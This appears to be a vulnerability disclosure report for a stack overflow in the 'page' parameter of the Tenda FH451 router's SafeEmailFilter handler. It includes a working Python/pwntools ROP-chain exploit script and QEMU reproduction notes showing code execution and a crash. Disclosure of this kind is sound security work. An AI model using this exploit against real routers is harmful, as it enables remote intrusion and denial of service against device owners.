# Notification of Remote Code Execution Vulnerability in Tenda FH451 Router (Version V1.0.0.9) by Shenzhen Jixiang Tenda Technology

Router firmware download link: [https://tenda.com.cn/material/show/101629](https://tenda.com.cn/material/show/101629)

Vulnerability URL: [http://192.168.100.166/goform/SafeEmailFilter](http://192.168.100.166/goform/SafeEmailFilter)

## Vulnerability Analysis.

The vulnerability occurs in the `formSafeEmailFilter` function.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE1.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE2.png)

The program retrieves the user input parameter `"page"` but does not check its size. When the input parameter is too large, it causes a stack overflow, leading to program crashes or potential exploitation.  
Cross-referencing the function `formSafeEmailFilter` with the route `SafeEmailFilter`, line 105. The vulnerability occurs in the `formSafeEmailFilter` function.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE3.png)
Cross-referencing further to `sub_64EAC`, paying attention to lines 44 and 47.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE4.png)
Yes, based on the cross-referencing, the vulnerability occurs on the page path `goform/SafeEmailFilter`.

## payload
```
import requests
from pwn import *

addr=0x0064920
libc=ELF("./lib/libc.so.0")
system_offset = libc.symbols["system"]
base=0xf6636000
system_addr = base + system_offset
cmd = b"Hello,world\x00"
puts = base+libc.sym['puts']

move_r0=base+0x00040cb8
r3_pop=base+0x00018298

url = "http://192.168.100.166/goform/SafeEmailFilter"
payload = {
'op':b'add',
      'page':b'a'*99+p32(r3_pop)+p32(puts)+p32(move_r0)+cmd

    }
res = requests.post(url=url,data=payload)
```

## Reproduce the following:Open the QEMU simulation.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE5.png)

![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE6.png)
Important: Here, "page not found" means the gateway page was not found, not that the router is not running.

After running the script, it was found that the program was interrupted due to a stack overflow, and the string "Hello, world" was printed, with the `puts` command being executed.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE7.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE8.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE9.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/RCE10.png)
The router crashes, the webpage becomes inaccessible, and the string "Hello, world" is printed.
